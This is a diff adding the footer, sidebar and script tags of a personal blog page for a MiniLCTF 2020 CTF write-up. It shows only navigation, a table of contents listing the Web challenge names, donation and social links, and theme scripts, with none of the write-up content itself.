+          <a href="/tags/Web/" rel="tag"><i class="ic i-tag"></i> Web</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2021-12-15 16:20:05" itemprop="dateModified" datetime="2021-12-15T16:20:05+08:00">2021-12-15</time>
+  </span>
+  <span id="MiniLCTF_2020题解/" class="item leancloud_visitors" data-flag-title="MiniLCTF_2020 题解" title="Views">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">Views</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">times</span>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="cheuncey Zhang WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="cheuncey Zhang Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="cheuncey Zhang PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>cheuncey Zhang <i class="ic i-at"><em>@</em></i>Canary's Blog
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="https://zephyr-cyber.github.io.git/MiniLCTF_2020%E9%A2%98%E8%A7%A3/" title="MiniLCTF_2020 题解">https://zephyr-cyber.github.io.git/MiniLCTF_2020题解/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/moeCTF_2021%E9%A2%98%E8%A7%A3/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zephyr-cyber&#x2F;Blog-Gallery@main&#x2F;&#x2F;blog-img&#x2F;50447-JakuChara_Tomozakikun-PC-Wallpaper.jpg" title="MoeCTF_2021题解">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> computer-science</span>
+  <h3>MoeCTF_2021题解</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/AWD/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zephyr-cyber&#x2F;Blog-Gallery@main&#x2F;&#x2F;blog-img&#x2F;54235-BanG_Dream-HikawaHina-PC-Wallpaper.jpg" title="AWD脚本和加固命令">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> computer-science</span>
+  <h3>AWD脚本和加固命令</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#id_wife"><span class="toc-number">1.0.1.</span> <span class="toc-text"> id_wife</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#p"><span class="toc-number">1.0.2.</span> <span class="toc-text"> P</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE-%E5%88%B0-%E9%A2%98"><span class="toc-number">1.0.3.</span> <span class="toc-text"> 签 到 题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#are-you-reclu3e-author-blackwatch"><span class="toc-number">1.0.4.</span> <span class="toc-text"> are you reclu3e?| Author: blackwatch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip-echo-service"><span class="toc-number">1.1.</span> <span class="toc-text"> IP echo service</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezlogin"><span class="toc-number">1.2.</span> <span class="toc-text"> ezlogin</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/computer-science/Misc/BUGKUmisc/" rel="bookmark" title="bugku-MISC">bugku-MISC</a></li><li><a href="/computer-science/Misc/%E6%AF%94%E8%B5%9Bmisc/" rel="bookmark" title="比赛MISC">比赛MISC</a></li><li><a href="/computer-science/Pwn/pwn/" rel="bookmark" title="pwn学习(1)">pwn学习(1)</a></li><li><a href="/computer-science/Pwn/pwn2/" rel="bookmark" title="pwn学习(2)">pwn学习(2)</a></li><li><a href="/computer-science/Reverse/reverse/" rel="bookmark" title="学习Reverse">学习Reverse</a></li><li><a href="/computer-science/Web/Web/" rel="bookmark" title="web学习">web学习</a></li><li><a href="/computer-science/Crypto/Crypto/" rel="bookmark" title="Crypto">Crypto</a></li><li><a href="/computer-science/Pwn/pwn3/" rel="bookmark" title="pwn3">pwn3</a></li><li><a href="/computer-science/Pwn/pwn4/" rel="bookmark" title="pwn4-stack pivoting">pwn4-stack pivoting</a></li><li><a href="/computer-science/Reverse/reverse2/" rel="bookmark" title="学习Reverse2">学习Reverse2</a></li><li><a href="/MiniLCTF_2021%E9%A2%98%E8%A7%A3/" rel="bookmark" title="MiniLCTF_2021题解">MiniLCTF_2021题解</a></li><li><a href="/moeCTF_2021%E9%A2%98%E8%A7%A3/" rel="bookmark" title="MoeCTF_2021题解">MoeCTF_2021题解</a></li><li class="active"><a href="/MiniLCTF_2020%E9%A2%98%E8%A7%A3/" rel="bookmark" title="MiniLCTF_2020题解">MiniLCTF_2020题解</a></li><li><a href="/AWD/" rel="bookmark" title="AWD脚本和加固命令">AWD脚本和加固命令</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="cheuncey Zhang"
+      data-src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/16f8bec9f7fbb60bf0c3a1d2fa12affd.jpeg">
+  <p class="name" itemprop="name">cheuncey Zhang</p>
+  <div class="description" itemprop="description">刻意练习</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">49</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">20</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">16</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly96ZXBoeXItY3liZXIuZ2l0aHViLmlv" title="https:&#x2F;&#x2F;zephyr-cyber.github.io"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS8=" title="https:&#x2F;&#x2F;twitter.com&#x2F;"><i class="ic i-twitter"></i></span>
+      <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS8=" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;"><i class="ic i-zhihu"></i></span>
+      <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvbXkvbS9tdXNpYy9wbGF5bGlzdD9pZD0yMjI2MDQ2MDI3" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;my&#x2F;m&#x2F;music&#x2F;playlist?id&#x3D;2226046027"><i class="ic i-cloud-music"></i></span>
+      <span class="exturl item weibo" data-url="aHR0cHM6Ly93ZWliby5jb20v" title="https:&#x2F;&#x2F;weibo.com&#x2F;"><i class="ic i-weibo"></i></span>
+      <span class="exturl item about" data-url="aHR0cHM6Ly9hYm91dC5tZS8=" title="https:&#x2F;&#x2F;about.me&#x2F;"><i class="ic i-address-card"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjEzMjc4MzcwMzFAcXEuY29tLmNvbQ==" title="mailto:1327837031@qq.com.com"><i class="ic i-envelope"></i></span>
+      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;"><i class="ic i-facebook"></i></span>
+      <span class="exturl item stackoverflow" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS8=" title="https:&#x2F;&#x2F;stackoverflow.com&#x2F;"><i class="ic i-stack-overflow "#1e88e5""></i></span>
+      <span class="exturl item youtube" data-url="aHR0cHM6Ly95b3V0dWJlLmNvbS8=" title="https:&#x2F;&#x2F;youtube.com&#x2F;"><i class="ic i-youtube  "#e60026""></i></span>
+      <span class="exturl item instagram" data-url="aHR0cHM6Ly9pbnN0YWdyYW0uY29tLw==" title="https:&#x2F;&#x2F;instagram.com&#x2F;"><i class="ic i-instagram "#1e88e5""></i></span>
+      <span class="exturl item skype" data-url="c2t5cGU6MTIzP2NhbGx8Y2hhdA==" title="skype:123?call|chat"><i class="ic i-skype "#1e88e5""></i></span>
+      <span class="exturl item douban" data-url="aHR0cHM6Ly93d3cuZG91YmFuLmNvbS9wZW9wbGUv" title="https:&#x2F;&#x2F;www.douban.com&#x2F;people&#x2F;"><i class="ic i-douban "#191717""></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>About</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>Posts</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>Archives</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>Categories</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>Tags</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/friends/" rel="section"><i class="ic i-heart"></i>Friends</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/films/" rel="section"><i class="ic i-heart"></i>films</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/fun-links/" rel="section"><i class="ic i-android"></i>fun-links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/moeCTF_2021%E9%A2%98%E8%A7%A3/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/AWD/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="In 计算机科学">计算机科学</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/CTF/" title="In CTF">CTF</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/CTF/Reverse/" title="In Reverse">Reverse</a>
+</div>
+
+    <span><a href="/reverse/" title="学习Reverse">学习Reverse</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/computer-science/" title="In computer-science">computer-science</a>
+</div>
+
+    <span><a href="/MiniLCTF_2020%E9%A2%98%E8%A7%A3/" title="MiniLCTF_2020题解">MiniLCTF_2020题解</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/no-title/" title="Untitled">Untitled</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Foo/" title="In Foo">Foo</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/Foo/Bar/" title="In Bar">Bar</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/Foo/Bar/Baz/" title="In Baz">Baz</a>
+</div>
+
+    <span><a href="/categories/" title="Categories">Categories</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/English/" title="In English">English</a>
+</div>
+
+    <span><a href="/English/" title="Learn English">Learn English</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/code-highlight/" title="Code Highlight Style test">Code Highlight Style test</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="In 计算机科学">计算机科学</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%9D%82%E8%B0%88/" title="In 二进制杂谈">二进制杂谈</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%9D%82%E8%B0%88/Theme-Shoka-Documentation/" title="In Theme Shoka Documentation">Theme Shoka Documentation</a>
+</div>
+
+    <span><a href="/computer-science/note/theme-shoka-doc/special/" title="Step.4 主题特殊功能">Step.4 主题特殊功能</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/pwn2/" title="pwn学习(2)">pwn学习(2)</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/accumulate/" title="accumulate">accumulate</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/computer-science/" title="In computer-science">computer-science</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/computer-science/Misc/" title="In Misc">Misc</a>
+</div>
+
+    <span><a href="/computer-science/Misc/BUGKUmisc/" title="bugku-MISC">bugku-MISC</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">cheuncey Zhang @ Canary</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="Symbols count total">166k words</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="Reading time total">2:31</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly96ZXBoeXItY3liZXIuZ2l0aHViLmlv">Canary</span> & Inspire.<span class="exturl" data-url="aHR0cHM6Ly96ZXBoeXItY3liZXIuZ2l0aHViLmlv">taotaotao!</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'MiniLCTF_2020题解/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
